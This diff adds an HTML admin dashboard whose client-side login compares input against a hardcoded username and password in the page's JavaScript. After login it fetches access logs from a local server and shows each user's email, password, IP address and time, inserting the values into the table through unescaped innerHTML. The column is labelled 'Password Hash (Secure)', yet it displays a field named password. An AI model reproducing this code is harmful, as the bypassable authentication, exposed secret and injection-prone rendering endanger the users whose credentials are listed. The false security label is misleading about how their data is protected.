@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Dashboard</title>
+    <style>
+        body {
+            font-family: sans-serif;
+            padding: 20px;
+        }
+
+        #login-form {
+            max-width: 300px;
+            margin: 100px auto;
+            padding: 20px;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+        }
+
+        #dashboard {
+            display: none;
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 20px;
+        }
+
+        th,
+        td {
+            border: 1px solid #ddd;
+            padding: 8px;
+            text-align: left;
+        }
+
+        th {
+            background-color: #f2f2f2;
+        }
+
+        .error {
+            color: red;
+        }
+    </style>
+</head>
+
+<body>
+
+    <div id="login-form">
+        <h2>Admin Login</h2>
+        <input type="text" id="username" placeholder="Username" style="width: 100%; margin-bottom: 10px; padding: 8px;">
+        <input type="password" id="password" placeholder="Password"
+            style="width: 100%; margin-bottom: 10px; padding: 8px;">
+        <button onclick="login()"
+            style="width: 100%; padding: 10px; background: #4285f4; color: white; border: none; cursor: pointer;">Login</button>
+        <p id="error-msg" class="error"></p>
+    </div>
+
+    <div id="dashboard">
+        <h2>Access Logs</h2>
+        <table id="logs-table">
+            <thead>
+                <tr>
+                    <th>ID</th>
+                    <th>Email</th>
+                    <th>Password Hash (Secure)</th>
+                    <th>IP Address</th>
+                    <th>Time</th>
+                </tr>
+            </thead>
+            <tbody></tbody>
+        </table>
+    </div>
+
+    <script>
+        function login() {
+            const u = document.getElementById('username').value;
+            const p = document.getElementById('password').value;
+
+            // Simple client-side check for demonstration as requested
+            if (u === 'admin' && p === 'yassin6up') {
+                document.getElementById('login-form').style.display = 'none';
+                document.getElementById('dashboard').style.display = 'block';
+                fetchLogs();
+            } else {
+                document.getElementById('error-msg').innerText = 'Invalid credentials';
+            }
+        }
+
+        async function fetchLogs() {
+            try {
+                const response = await fetch('http://localhost:3000/admin/data');
+                const data = await response.json();
+                console.log(data.logs);
+                const tbody = document.querySelector('#logs-table tbody');
+                tbody.innerHTML = '';
+
+                data.logs.forEach(log => {
+
+                    const row = `<tr>
+                        <td>${log.id}</td>
+                        <td>${log.email}</td>
+                        <td >${log.password}</td>
+                        <td>${log.ip_address}</td>
+                        <td>${new Date(log.timestamp).toLocaleString()}</td>
+                    </tr>`;
+                    tbody.innerHTML += row;
+                });
+            } catch (err) {
+                console.error('Error fetching logs:', err);
+            }
+        }
+    </script>
+</body>
+
+</html>
